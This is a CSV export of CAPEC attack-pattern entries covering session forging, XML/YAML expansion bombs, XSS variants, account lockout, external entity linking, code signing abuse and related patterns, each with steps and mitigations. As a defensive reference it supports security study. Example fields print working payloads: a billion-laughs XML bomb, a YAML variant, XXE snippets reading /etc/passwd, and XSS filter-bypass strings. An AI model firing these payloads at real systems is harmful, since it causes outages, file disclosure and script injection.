'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes
196,"Session Credential Falsification through Forging",Standard,Draft,"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.","",Medium,Medium,"::NATURE:CanPrecede:CAPEC ID:384::NATURE:CanPrecede:CAPEC ID:61::NATURE:ChildOf:CAPEC ID:21::","::STEP:1:PHASE:Explore:DESCRIPTION:[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.:TECHNIQUE:An attacker makes many anonymous connections and records the session IDs.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.:TECHNIQUE:The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim.::","::The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.::","::SKILL:Forge the session credential and reply the request.:LEVEL:Medium::","::Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::","::This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.::","::384::664::","TAXONOMY NAME:ATTACK:ENTRY ID:1134.002:ENTRY NAME:Access Token Manipulation: Create Process with Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1134.003:ENTRY NAME:Access Token Manipulation: Make and Impersonate Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1606:ENTRY NAME:Forge Web Credentials::","",
197,"Exponential Data Expansion",Detailed,Draft,"An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.","::TERM:Billion Laughs Attack:DESCRIPTION:::TERM:XML Bomb:DESCRIPTION:::TERM:XML Entity Expansion (XEE):DESCRIPTION:::",High,Medium,"::NATURE:ChildOf:CAPEC ID:230::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using subsitituion on the victim's side.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious payload] The adversary crafts a malicious message containing nested exponential expansion that completely uses up available server resources. See the Example Instances section for details on how to craft this malicious payload.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::","::This type of attack requires that the target must receive input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.::","::SKILL:Ability to craft nested data expansion messages.:LEVEL:Low::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::","::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::","::The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.::This example is similar, but uses YAML. This was used to attack Kubernetes [REF-686] a: &a [lol,lol,lol,lol,lol,lol,lol,lol,lol]b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]::","::770::776::","TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::","",
198,"XSS Targeting Error Pages",Detailed,Draft,"An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page.","",,Medium,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs as URL parameters] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application, looking for URLs which use parameters.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause application to return error page] The adversary uses the URLs gathered in the Explore phase as a target list and injects various common script payloads and special characters into the parameters to see if an error page occurs, and if the injected payload is executed by the error page.:TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they caused errors::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS through an error page, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::A third party web server which fails to adequately sanitize messages sent in error pages.::The victim must be made to execute a query crafted by the adversary which results in the infected error report.::","","::None: No specialized resources are required to execute this type of attack.::","","","::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for any input that will be used in error messages.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::","","::81::","","",
199,"XSS Using Alternate Syntax",Detailed,Draft,"An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.","",High,High,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before using alternate syntax. These inputs are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and try many variations of characters injection that would enable the XSS payload. They record all the responses from the server that include unmodified versions of their script.:TECHNIQUE:Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag created using alternate syntax to bypass filters.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::Target client software must allow scripting such as JavaScript.::","::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass non trivial filters in the application:LEVEL:High::","::Ability to send HTTP request to a web application.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::","::In this example, the adversary tries to get <script>alert(1)</script> executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An adversary will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the adversary: <script>alert(1)</script> In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the adversary to execute the same payload as in the previous example, they would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An adversary will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The adversary could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.::","::87::","","",
2,"Inducing Account Lockout",Standard,Draft,"An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.","",High,Medium,"::NATURE:ChildOf:CAPEC ID:212::","::STEP:1:PHASE:Experiment:DESCRIPTION:[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout:TECHNIQUE:Analyze system documentation to find list of events that could potentially cause account lockout:TECHNIQUE:Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly:TECHNIQUE:Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out:TECHNIQUE:Obtain list of authorized users using another attack pattern, such as SQL Injection.:TECHNIQUE:Attempt to create accounts if possible; system should indicate if a user ID is already taken.:TECHNIQUE:Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.:TECHNIQUE:For each user ID to be locked out, perform the lockout procedure discovered in the first step.::","::The system has a lockout mechanism.::An attacker must be able to reproduce behavior that would result in an account being locked.::","::SKILL:No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.:LEVEL:Low::","::Computer with access to the login portion of the target system::","","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::","::Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.::When implementing security features, consider how they can be misused and made to turn on themselves.::","::A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.::","::645::","TAXONOMY NAME:ATTACK:ENTRY ID:1531:ENTRY NAME:Account Access Removal::","",
20,"Encryption Brute Forcing",Standard,Draft,"An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.","",Low,Low,"::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:668::","::STEP:1:PHASE:Explore:DESCRIPTION:Determine the ciphertext and the encryption algorithm.::STEP:2:PHASE:Experiment:DESCRIPTION:Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.::","::Ciphertext is known.::Encryption algorithm and key size are known.::","::SKILL:Brute forcing encryption does not require much skill.:LEVEL:Low::","::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge). On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext. Obviously as N gets large the brute force approach becomes infeasible.::","::None. This attack happens offline.::","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.::In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.::","::In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.::","::326::327::693::1204::","","",
200,"Removal of filters: Input filters, output filters, data masking",Detailed,Draft,"An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content.","",,Medium,"::NATURE:ChildOf:CAPEC ID:207::","","::The target application must utilize some sort of filtering mechanism (input, output, or data masking).::","","::None: No specialized resources are required to execute this type of attack.::","","","","","","","",
201,"Serialized Data External Linking",Detailed,Draft,"An adversary creates a serialized data file (e.g. XML, YAML, etc...) that contains an external data reference. Because serialized data parsers may not validate documents with external references, there may be no checks on the nature of the reference in the external data. This can allow an adversary to open arbitrary files or connections, which may further lead to the adversary gaining access to information on the system that they would normally be unable to obtain.","",High,High,"::NATURE:ChildOf:CAPEC ID:122::NATURE:ChildOf:CAPEC ID:278::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an adversary records all instances of web services that process requests with serialized data.:TECHNIQUE:Use an automated tool to record all instances of URLs that process requests with serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes serialized data requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious data message that contains references to sensitive files.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an External Linking attack] Send the malicious crafted message containing the reference to a sensitive file to the target URL.::","::The target must follow external data references without validating the validity of the reference target.::","::SKILL:To send serialized data messages with maliciously crafted schema.:LEVEL:Low::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::Configure the serialized data processor to only retrieve external entities from trusted sources.::","::The following DTD would attempt to open the /dev/tty device: <!DOCTYPE doc [ <!ENTITY ent SYSTEM file:///dev/tty> ]> A malicious actor could use this crafted DTD to reveal sensitive information.::The following XML snippet would attempt to open the /etc/passwd file: <foo xmlns:xi=http://www.w3.org/2001/XInclude> <xi:include parse=text href=file:///etc/passwd/></foo>::","::829::","","",
202,"Create Malicious Client",Standard,Draft,"An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures.","",,Medium,"::NATURE:ChildOf:CAPEC ID:22::","","::The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary.::","","::The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.::","","","","","::602::","","",
203,"Manipulate Registry Information",Standard,Stable,"An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.","",,Medium,"::NATURE:ChildOf:CAPEC ID:176::","","::The targeted application must rely on values stored in a registry.::The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.::","::SKILL:The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.:LEVEL:High::","::None: No specialized resources are required to execute this type of attack.::","","","::Ensure proper permissions are set for Registry hives to prevent users from modifying keys.::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::","::Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).::","::15::","TAXONOMY NAME:ATTACK:ENTRY ID:1112:ENTRY NAME:Modify Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1647:ENTRY NAME:Plist Modification::","",
204,"Lifting Sensitive Data Embedded in Cache",Detailed,Draft,"An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.","",,Medium,"::NATURE:ChildOf:CAPEC ID:167::NATURE:CanPrecede:CAPEC ID:560::","::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.:TECHNIQUE:Use probing tools to look for application cache files on a machine.:TECHNIQUE:Use a web application and determine if any sensitive information is stored in browser cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.:TECHNIQUE:Use priviledge escalation to access cache files that might have strict privileges.:TECHNIQUE:If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.:TECHNIQUE:Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions.::","::The target application must store sensitive information in a cache.::The cache must be inadequately protected against attacker access.::","","::The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.::","","","","","::524::311::1239::1258::","TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::","",
205,"DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",Detailed,Deprecated,"This attack pattern has been deprecated as it is a duplicate of CAPEC-37 : Retrieve Embedded Sensitive Data. Please refer to this other pattern going forward.","",,,"","","","","","","","","","","","",
206,"Signing Malicious Code",Detailed,Draft,"The adversary extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the adversary has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the adversary to execute arbitrary code on the victim's computer. This differs from CAPEC-673, because the adversary is performing the code signing.","",,Very High,"::NATURE:ChildOf:CAPEC ID:444::","::STEP:1:PHASE:Explore:DESCRIPTION:The adversary first attempts to obtain a digital certificate in order to sign their malware or tools. This certificate could be stolen, created by the adversary, or acquired normally through a certificate authority.::STEP:2:PHASE:Explore:DESCRIPTION:Based on the type of certificate obtained, the adversary will create a goal for their attack. This is either a broad or targeted attack. If an adversary was able to steal a certificate from a targeted organization, they could target this organization by pretending to have legitimate code signed by them. In other cases, the adversary would simply sign their malware and pose as legitimate software such that any user might trust it. This is the more broad approach::STEP:3:PHASE:Experiment:DESCRIPTION:The adversary creates their malware and signs it with the obtained digital certificate. The adversary then checks if the code that they signed is valid either through downloading from the targeted source or testing locally.::STEP:4:PHASE:Exploit:DESCRIPTION:Once the malware has been signed, it is then deployed to the desired location. They wait for a trusting user to run their malware, thinking that it is legitimate software. This malware could do a variety of things based on the motivation of the adversary.::","::The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the adversary does not need to steal the signing key before forging code bundles in the developer's name.)::","","::None: No specialized resources are required to execute this type of attack.::","","","::Ensure digital certificates are protected and inaccessible by unauthorized uses.::If a digital certificate has been compromised it should be revoked and regenerated.::Even if a piece of software has a valid and trusted digital signature, it should be assessed for any weaknesses and vulnerabilities.::","::In the famous Stuxnet malware incident, two digital certificates were compromised in order to sign malicious device drivers with legitimate credentials. The signing resulted in the malware appearing as trusted by the system it was running on, which facilitated the installation of the malware in kernel mode. This further resulted in Stuxnet remaining undetected for a significant amount of time. [REF-699]::The cyber espionage group CyberKittens leveraged a stolen certificate from AI Squared that allowed them to leverage a signed executable within Operation Wilted Tulip. This ultimately allowed the executable to run as trusted on the system, allowing a Crowd Strike stager to be loaded within the system's memory. [REF-714]::","::732::","TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls:Code Signing::","",
207,"Removing Important Client Functionality",Standard,Draft,"An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:22::","::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The adversary probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.:TECHNIQUE:The adversary probes by exploring an application's functionality and its underlying mapping to server-side components.:TECHNIQUE:The adversary reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine which functionality to disable or remove] The adversary tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.:TECHNIQUE:The adversary reverse engineers the client-side code to determine which functionality to disable or remove.::STEP:3:PHASE:Exploit:DESCRIPTION:[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the adversary disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.:TECHNIQUE:The adversary disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.::","::The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.::","::SKILL:To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on.:LEVEL:High::SKILL:The adversary installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools.:LEVEL:Low::","::The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.::Design: Ship client-side application with integrity checks (code signing) when possible.::Design: Use obfuscation and other techniques to prevent reverse engineering the client code.::","::The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.::The adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).::","::602::","","",
